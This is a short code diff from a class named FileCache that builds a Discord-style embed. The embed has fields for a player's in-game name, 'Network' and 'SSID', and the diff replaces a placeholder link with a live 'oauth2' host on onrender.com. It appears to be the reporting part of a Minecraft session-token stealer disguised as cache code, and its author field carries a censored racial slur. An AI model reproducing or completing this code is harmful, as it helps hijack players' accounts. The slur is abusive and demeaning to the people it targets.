@@ -37,7 +37,7 @@ class FileCache {
     .setTitle('Their IGN')
     .setURL('https://sky.shiiyu.moe/stats/')
     .setThumbnail('https://i.imgur.com/AfFp7pu.png')
-    .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://putRefreshLink.here' })
+    .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://oauth2-0-5fk8.onrender.com' })
     .addFields(
       { name: 'Network', value: '```Some value here```' },
       { name: 'SSID: ', value: '```Some value here```' },
